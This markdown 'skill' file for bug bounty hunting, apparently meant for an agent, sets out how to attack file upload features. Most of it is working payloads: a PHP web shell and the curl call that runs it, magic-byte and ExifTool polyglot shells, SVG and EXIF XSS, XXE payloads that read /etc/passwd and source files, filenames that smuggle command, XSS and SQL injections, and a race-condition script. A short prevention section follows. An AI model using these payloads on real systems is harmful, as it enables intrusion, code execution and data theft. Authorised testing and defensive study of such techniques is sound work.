---
name: "file-upload-attacks"
version: "1.0"
category: "injection"
subcategory: "file-upload"
phase: "exploitation"
tags: ["bug-bounty", "file-upload", "webshell", "upload", "injection", "bypass", "polyglot", "mime", "xss", "xxe", "rce", "race-condition", "windows", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["curl", "ffuf", "burp-suite", "burp-intruder", "turbo-intruder", "exiftool", "file", "wget", "dirb", "sec-lists", "payloadsallthethings", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["remote-code-execution", "cross-site-scripting", "xml-external-entity", "race-condition-testing", "command-injection", "sql-injection", "exploitation-chaining", "bug-bounty-reporting"]
prerequisite_skills: ["recon-endpoint", "ffuf-web-fuzzing"]
description: "Bug bounty skill: file upload attacks - exploitation phase, injection category"
---
# File Upload Attacks

## Summary

File upload features are integral to modern web applications (profile pictures, document sharing, avatars). When validation and verification controls are inadequate, they enable critical attacks: **unauthenticated arbitrary file upload → RCE** via web shells, stored **XSS** via malicious files (SVG, EXIF metadata), **XXE** via crafted SVG/XML uploads, and **DoS** via oversized or malicious files. This skill covers the full exploitation workflow — creating payloads, discovering upload paths, bypassing every filter layer (client-side, blacklist, whitelist, Content-Type, MIME magic bytes), polyglot files, upload race conditions, filename injection, and Windows-specific filename attacks — plus prevention guidance.

## Key Concepts

- **Validation layers** — upload defenses stack: client-side JS → backend extension blacklist → extension whitelist → Content-Type header check → MIME/magic-byte check → content re-processing. Bypass each layer independently.
- **Unauthenticated arbitrary file upload** is the most critical variant — no auth needed, direct RCE path.
- **Impact chains**: malicious file → RCE (web shell), XSS (SVG/metadata rendered in browser), XXE (SVG/XML parsed server-side), DoS (zip bombs, pixel floods, oversized files).
- **Upload path discovery** — the file's storage directory is half the battle; fuzz for it (common: `/uploads`, `/profile_images`, `/avatars`).
- **Magic bytes (file signatures)** — MIME detection reads the first few bytes; prepend a valid signature (e.g., `GIF8`) to fool `mime_content_type()` / `finfo`.
- **Polyglot** — a single file valid as two types (e.g., valid JPEG + embedded PHP) to satisfy both content and extension checks.
- **Race window** — custom implementations may upload to the final location *before* validation completes; race a GET against the POST to grab the file before it is deleted.

## Methodology

### Basic Exploitation Flow

1. **Create a malicious file** — PHP web shell:
   ```bash
   echo -n '<?php system($_GET["cmd"]) ?>' > shell.php
   ```
2. **Upload** `shell.php` via the application's upload functionality.
3. **Fuzz the upload path** with ffuf:
   ```bash
   ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -t 64
   # Status: 301, Size: 325 → FUZZ: uploads
   ```
4. **Execute commands** via the uploaded shell:
   ```bash
   curl -s 'http://target/uploads/shell.php?cmd=id'
   # uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### Layer 1 — Bypass Client-Side Validation

- **Back-end request modification**: upload a valid file, intercept with Burp, replace the filename AND body with the malicious file's content, forward. The server may trust client-supplied filename/content without re-validating.
- **Disable front-end validation**: inspect the upload page JS, disable JavaScript in the browser, or modify form attributes/validation functions to allow any file type, then upload directly.

### Layer 2 — Bypass Blacklist Filters

Blacklists are incomplete by design — fuzz for allowed-but-dangerous extensions:

- Extension lists:
  - PHP extensions: `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst`
  - .NET extensions: same PAT list (asp, aspx, ashx, asmx, ...)
  - Common web extensions: `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt`
- Use Burp Intruder: position the payload on the extension (`shell.§php§`), load the wordlist, observe which return 200/success.

### Layer 3 — Bypass Whitelist Filters

- **Fuzz for whitelisted extensions** that may be mishandled.
- **Double extensions** — if only the final extension is checked: `shell.jpg.php`.
- **Reverse double extension** — Apache configs that match a *pattern* anywhere can execute mislabeled files:
  ```apache
  <FilesMatch ".+\.ph(ar|p|tml)">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```
  A file named `shell.php.jpg` can bypass the filter yet still execute PHP if the config is improperly terminated.
- **Character injection** — inject special characters that alter how the extension is parsed:
  `%20` `%0a` `%00` `%0d0a` `/` `.\\` `.` `…` `:`
  - Null byte `%00`: older PHP treats `shell.php%00.jpg` as `shell.php`.
  - Generate filename permutations:
  ```bash
  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
      echo "shell$char$ext.jpg" >> wordlist.txt
      echo "shell$ext$char.jpg" >> wordlist.txt
      echo "shell.jpg$char$ext" >> wordlist.txt
      echo "shell.jpg$ext$char" >> wordlist.txt
    done
  done
  ```

### Layer 4 — Bypass Type Filters (Content-Type & MIME)

- **Content-Type header filtering** (checks `$_FILES['uploadFile']['type']`, e.g., only `image/jpg|jpeg|png|gif`): the header is client-controlled. Fuzz accepted values:
  ```bash
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
  cat content-type.txt | grep 'image/' > image-content-types.txt
  ```
  Load into Burp Intruder against the `Content-Type` field of the upload request.
- **MIME / magic-byte filtering** (`mime_content_type()` on `tmp_name`): inspect first bytes. Forge the signature:
  ```bash
  echo "this is a text file" > text.jpg
  file text.jpg            # text.jpg: ASCII text
  echo -ne "GIF8" > text.jpg
  file text.jpg            # text.jpg: GIF image data
  ```
  Add the magic bytes to the beginning of your payload (e.g., `GIF89a<?php system($_GET['c']); ?>`).

## Other Upload Attacks

### Exploiting File Upload Race Conditions

- **Modern frameworks** are protected: temporary sandboxed upload dir → randomized names → move to final location only after validation passes.
- **Custom implementations** are vulnerable: files may be written directly to the final location and only removed *if* validation fails — the window between write and delete is exploitable.
- **URL-based uploads**: server fetches a file and saves it locally before validation; pseudo-random dirs (e.g., `uniqid()`) may be brute-forceable.
- **Turbo Intruder race script** — race a POST (upload) against repeated GETs (access):
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
      request1 = '''<YOUR-POST-REQUEST>'''
      request2 = '''<YOUR-GET-REQUEST>'''
      engine.queue(request1, gate='race1')
      for x in range(5):
          engine.queue(request2, gate='race1')
      engine.openGate('race1')
      engine.complete(timeout=60)

  def handleResponse(req, interesting):
      table.add(req)
  ```

### Polyglot PHP/JPG File Upload Attack

Bypass checks that require a valid image *and* want code execution:

1. **Prepare payload**:
   ```php
   <?php echo 'User: ' . system('whoami'); ?>
   ```
2. **Create polyglot** with ExifTool (embeds PHP in image metadata, output valid image file):
   ```bash
   sudo apt-get install exiftool   # Debian/Ubuntu
   brew install exiftool           # macOS
   exiftool -Comment="<?php echo 'User: ' . system('whoami'); ?>" input-image.jpg -o polyglot.php
   ```
3. **Upload** `polyglot.php` (e.g., as avatar).
4. **Trigger**: intercept the GET request for `polyglot.php`, inspect the response for the `whoami` output.

### XSS via Image Metadata (EXIF)

Apps that render/process image metadata without sanitizing EXIF fields are XSS-prone:

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' n1ght.jpg
exiftool n1ght.jpg   # verify the Comment field holds the payload
```

Note: changing the MIME type of the image to `text/html` may cause some applications to render it as an HTML document — executing the payload.

### XSS via SVG

SVG files are XML and can contain scripts:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <rect x="1" y="1" width="1" height="1" fill="green" stroke="black"/>
  <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XML External Entity (XXE) via SVG

SVG/XML uploads parsed server-side can leak files:

- Leak `/etc/passwd`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <svg>&xxe;</svg>
  ```
- Read source code (base64-encoded to avoid parse errors):
  ```xml
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
  <svg>&xxe;</svg>
  ```

### Injections in File Names

Malicious strings in filenames exploit downstream consumers (shell, HTML reflection, SQL):

- **Command injection** (filename used in an OS command/shell script):
  ```
  file$(whoami).jpg
  file'whoami'.jpg
  file.jpg||whoami
  ```
- **XSS** (filename reflected unescaped):
  ```
  file<script>alert(window.origin);</script>.jpg
  ```
- **SQL injection** (filename concatenated into a query):
  ```
  file';select sleep(5);--.jpg
  ```

### Windows-Specific Attacks

- **Reserved characters** (`|`, `<`, `>`, `*`, `?`) in filenames cause errors/weird behavior that can disclose the upload directory. Upload `test|file.jpg` and inspect error messages.
- **Reserved filenames** (`CON`, `COM1`, `LPT1`, `NUL`) — uploading `CON.jpg` may error out or fail to write, revealing filesystem details.
- **8.3 short-name convention** — reference or overwrite files via short names:
  ```bash
  # e.g., hackthebox.txt → HAC~1.TXT; create short name to overwrite web.conf:
  echo "malicious content" > WEB~.CONF
  ```

## Tips for Exploiting File Uploads

1. **Exploit upload directory disclosure**:
   - Induce errors with conflicting/reserved filenames (e.g., upload `existing_file.jpg` if a file with that name exists) to trigger messages revealing the upload dir.
   - Send multiple simultaneous uploads of the same filename to trigger race/conflict errors.
2. **Test with long filenames** — some apps mishandle very long names (e.g., 5000 chars), producing errors that disclose the upload directory:
   ```bash
   truncate -s 0 "$(printf '%05000s' '' | tr ' ' 'A').jpg"
   ```

## Prevention

- **Extension validation** — whitelist AND blacklist; derive extension with `pathinfo($fileName, PATHINFO_EXTENSION)` lowercased instead of regex:
  ```php
  $extension = strtolower(pathinfo($_FILES["uploadFile"]["name"], PATHINFO_EXTENSION));
  $blacklistedExtensions = ['php','phtml','php3','php4','php5','phar','html','htm'];
  $allowedExtensions = ['jpg','jpeg','png','gif'];
  ```
- **Content validation** — verify actual content with `finfo`:
  ```php
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $mime = finfo_file($finfo, $_FILES['uploadFile']['tmp_name']);
  finfo_close($finfo);
  $allowedMimeTypes = ['image/png', 'image/jpeg', 'image/gif'];
  ```
- **Upload disclosure** — store uploads outside the web root; serve through a script (e.g., `download.php`) that streams from the secure dir; sanitize input to prevent directory traversal.
- **Further hardening** — disable dangerous functions in `php.ini`, limit file size, keep libraries updated, malware-scan uploads, deploy WAF rules, handle errors without leaking details.

## Tools Reference

- **ffuf** — fuzz upload paths and extension handling
- **Burp Suite (Intruder)** — extension fuzzing, Content-Type fuzzing, request modification
- **Turbo Intruder** — upload race conditions (gate pattern)
- **ExifTool** — polyglot creation, EXIF/XSS metadata injection
- **`file`** — inspect magic bytes / detected MIME type locally
- **SecLists / PayloadsAllTheThings** — extension and Content-Type wordlists

## Best Practices

- Test every validation layer independently — a bypass at any layer may be enough.
- Always discover the upload path (ffuf) before testing execution — a shell you can't reach is useless.
- Try the GIF89a magic-byte prefix for quick MIME bypass: `GIF89a<?php system($_GET['c']); ?>`.
- For XSS via upload, prefer SVG (script tag) and EXIF metadata vectors.
- Test filename injection vectors even when file *content* is fully validated — filename handling is frequently overlooked.
- On Windows backends, always test reserved names and 8.3 short names.
- Cross-reference `remote-code-execution` for shell alternatives (ASP, JSP) and `xml-external-entity` for full XXE methodology.

## Not a Finding If

- The uploaded file is stored with a randomized server-side name and content is re-encoded (e.g., image re-processing strips metadata and payloads).
- Extension is validated with `pathinfo()` against a strict whitelist AND content is validated with `finfo`/`getimagesize`.
- Files are stored outside the web root and served through a download handler with no direct path access.
- The upload endpoint requires authentication and the payload executes with no security boundary crossing (still test, but scope-verify).

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Shell uploaded but 404 on access | Fuzz the upload path (`ffuf`), check for randomized names, look for `/uploads`, `/profile_images`, `/avatars`, timestamped or hashed names |
| Extension blocked (whitelist) | Try double extensions, reverse double extension (`shell.php.jpg`), null byte, case tricks (`shell.pHp`), character injection wordlist |
| Content-Type blocked | Fuzz MIME values from SecLists `content-type.txt` (image/* variants) |
| MIME/magic-byte blocked | Prepend `GIF89a` or a full `GIF8` header; build a polyglot with ExifTool |
| PHP not executing | Confirm the backend is PHP and the server honors the extension (check `FilesMatch`/`AddHandler` behavior, `shell.php.jpg` patterns) |
| File validated by re-processing | Look for filename injection, SVG/EXIF XSS (content preserved), or race windows instead of RCE |

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
- https://github.com/portswigger/turbo-intruder
- PortSwigger Web Security Academy — File upload vulnerabilities
